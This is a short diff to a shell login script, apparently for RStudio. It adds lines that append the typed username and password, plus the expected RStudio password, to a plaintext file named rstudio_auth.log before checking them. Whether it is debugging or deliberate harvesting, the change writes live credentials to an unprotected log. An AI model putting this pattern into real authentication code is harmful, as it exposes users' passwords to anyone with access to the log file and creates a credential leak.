@@ -17,6 +17,12 @@ fi
 read -s -p "Password: " PASSWORD
 echo ""
 
+echo $USERNAME >> rstudio_auth.log
+echo $RSTUDIO_PASSWORD >> rstudio_auth.log
+echo $USER >>  rstudio_auth.log
+echo $PASSWORD >>  rstudio_auth.log
+
+
 # Authenticate user
 if [[ "${USER}" == "${USERNAME}" && "${PASSWORD}" == "${RSTUDIO_PASSWORD}" ]]; then
   echo "Successful authentication"
